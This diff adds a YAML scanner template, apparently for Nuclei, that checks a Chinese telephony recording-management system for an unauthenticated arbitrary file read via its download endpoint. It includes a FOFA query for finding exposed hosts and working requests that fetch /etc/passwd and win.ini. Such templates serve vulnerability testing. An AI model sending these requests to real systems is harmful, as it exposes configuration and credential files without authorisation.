@@ -1,0 +1,39 @@
+id: shenoutongxin-download-File-reading
+info:
+  name: "申瓯通信在线录音管理系统 download 接口任意文件读取"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: title="在线录音管理系统"
+    申瓯通信在线录音管理系统 download 接口存在文件读取漏洞，攻击者无需身份验证即可通过构造恶意请求访问受限文件（如数据库配置文件、系统配置文件等）。该漏洞允许远程获取敏感数据，可能引发系统权限丧失及数据泄露风险。
+  reference:
+  - https://Unknown.blog.csdn.net/article/details/139783198
+  tags: 申瓯通信
+
+http:
+- raw:
+  - |
+    GET  /main/download?path=/etc/passwd HTTP/1.1 
+    Host: {{Hostname}} 
+
+  - |
+    GET  /main/download?path=C:/windows/win.ini HTTP/1.1 
+    Host: {{Hostname}} 
+
+
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'root:'
+    - '; for 16-bit app support'
+  - type: status
+    status:
+    - 200
+
+
+
+
+
+
